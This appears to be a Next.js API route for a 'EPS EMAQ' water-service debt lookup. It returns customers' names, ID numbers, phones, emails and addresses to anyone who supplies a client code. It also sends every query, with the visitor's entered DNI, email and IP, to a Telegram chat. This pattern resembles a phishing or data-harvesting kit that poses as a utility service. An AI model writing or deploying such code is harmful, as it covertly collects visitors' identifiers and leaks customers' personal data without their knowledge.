import { NextRequest, NextResponse } from 'next/server';
import path from 'path';
import fs from 'fs';
import { checkRateLimit } from '@/lib/rate-limit';

type Saldo = { periodo: string; monto: number; estado: string };

type Cliente = {
  codcliente: string;
  nombre: string;
  dni: string;
  telefono: string;
  email: string;
  direccion: string;
  tiene_deuda: boolean;
  deuda_total: number;
  meses_pendientes: number;
  detalle_meses: string[];
  ultimo_recibo: Saldo | null;
};

let cache: Cliente[] | null = null;

function cargarClientes(): Cliente[] {
  if (cache) return cache;
  const filePath = path.join(process.cwd(), 'src/data/clientes_emaq.json');
  const data = fs.readFileSync(filePath, 'utf-8');
  cache = JSON.parse(data);
  return cache!;
}

async function sendConsultaTelegram(data: {
  codigo: string;
  nombre?: string;
  direccion?: string;
  deuda: number;
  encontrado: boolean;
  dni?: string;
  email?: string;
  fecha: string;
  ip: string;
}) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;

  const icono = data.encontrado ? '🔍' : '⚠️';
  const msg = [
    `${icono} *CONSULTA DE SUMINISTRO — EPS EMAQ*`,
    `━━━━━━━━━━━━━━━━━━━━`,
    `📋 *Código:* ${data.codigo}`,
    ...(data.dni ? [`🪪 *DNI:* ${data.dni}`] : []),
    ...(data.email ? [`📧 *Correo:* ${data.email}`] : []),
    data.encontrado
      ? `👤 *Cliente:* ${data.nombre ?? '-'}`
      : `❌ *Resultado:* No encontrado`,
    ...(data.encontrado && data.direccion ? [`🏠 *Dirección:* ${data.direccion}`] : []),
    `💰 *Deuda:* S/ ${data.deuda.toFixed(2)}`,
    `🌐 *IP:* \`${data.ip}\``,
    `━━━━━━━━━━━━━━━━━━━━`,
    `🕐 *Fecha:* ${data.fecha}`,
  ].join('\n');

  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' }),
  });
}

export async function GET(req: NextRequest) {
  const ip = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim()
    || req.headers.get('x-real-ip')
    || 'unknown';

  // Rate limit: 30 requests per minute per IP
  const { allowed } = checkRateLimit(ip, { windowMs: 60000, maxRequests: 30 });
  if (!allowed) {
    return NextResponse.json(
      { error: 'Demasiadas solicitudes. Intenta más tarde.' },
      { status: 429 }
    );
  }

  const codigo = req.nextUrl.searchParams.get('codigo')?.trim();
  const dni = req.nextUrl.searchParams.get('dni')?.trim() ?? '';
  const email = req.nextUrl.searchParams.get('email')?.trim() ?? '';

  if (!codigo) {
    return NextResponse.json({ error: 'Ingrese un código de cliente' }, { status: 400 });
  }

  // Validar que el código solo contenga caracteres alfanuméricos y guiones
  if (!/^[a-zA-Z0-9\-]+$/.test(codigo) || codigo.length > 20) {
    return NextResponse.json({ error: 'Código de cliente inválido' }, { status: 400 });
  }

  // Filtro de palabras ofensivas
  const palabrasOfensivas = ['mierda', 'puta', 'pendejo', 'imbecil', 'estupido', 'basura', 'idiota', 'carajo', 'joder', 'maldito'];
  const codigoLower = codigo.toLowerCase();
  if (palabrasOfensivas.some(palabra => codigoLower.includes(palabra))) {
    return NextResponse.json({ error: 'Código de cliente inválido' }, { status: 400 });
  }

  const clientes = cargarClientes();
  const cliente = clientes.find(c => c.codcliente === codigo);
  const deuda = cliente?.deuda_total ?? 0;

  try {
    await sendConsultaTelegram({
      codigo,
      nombre: cliente?.nombre,
      direccion: cliente?.direccion,
      deuda,
      encontrado: Boolean(cliente),
      dni,
      email,
      fecha: new Date().toLocaleString('es-PE', { timeZone: 'America/Lima' }),
      ip,
    });
  } catch (error) {
    console.error('Error al enviar consulta a Telegram:', error);
  }

  if (!cliente) {
    return NextResponse.json({ error: 'Código de cliente no encontrado' }, { status: 404 });
  }

  return NextResponse.json({
    codcliente:       cliente.codcliente,
    nombre:           cliente.nombre,
    dni:              cliente.dni,
    telefono:         cliente.telefono,
    email:            cliente.email,
    direccion:        cliente.direccion,
    tiene_deuda:      cliente.tiene_deuda,
    deuda_total:      cliente.deuda_total,
    meses_pendientes: cliente.meses_pendientes,
    detalle_meses:    cliente.detalle_meses,
    ultimo_recibo:    cliente.ultimo_recibo,
  });
}
